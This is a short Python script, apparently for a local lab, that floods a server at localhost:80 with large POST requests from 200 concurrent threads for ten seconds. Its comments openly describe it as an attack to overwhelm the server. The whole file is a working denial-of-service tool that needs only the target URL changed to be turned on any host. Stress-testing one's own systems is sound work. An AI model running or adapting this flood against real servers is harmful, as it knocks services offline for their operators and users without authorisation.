import threading
import requests
import time
 
url = "http://localhost:80"  # Target endpoint
 
def send_request(thread_id):
    while True:
        try:
            # Large payload to consume server resources
            payload = {"input": "a" * 100000}
            response = requests.post(url, data=payload, timeout=5)
            print(f"Thread {thread_id}: Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Thread {thread_id}: Request failed: {e}")
        time.sleep(0.1)  # Slight delay to simulate sustained attack
 
thread_count = 200  # High concurrency to overwhelm the server
threads = []
 
print(f"Starting attack with {thread_count} threads...")
 
for i in range(thread_count):
    t = threading.Thread(target=send_request, args=(i,))
    t.daemon = True  # Daemon threads exit when main program exits
    t.start()
    threads.append(t)
 
# Run the attack for a fixed duration (e.g., 10 seconds)
run_time_seconds = 10
time.sleep(run_time_seconds)
 
print("Attack simulation complete.")
 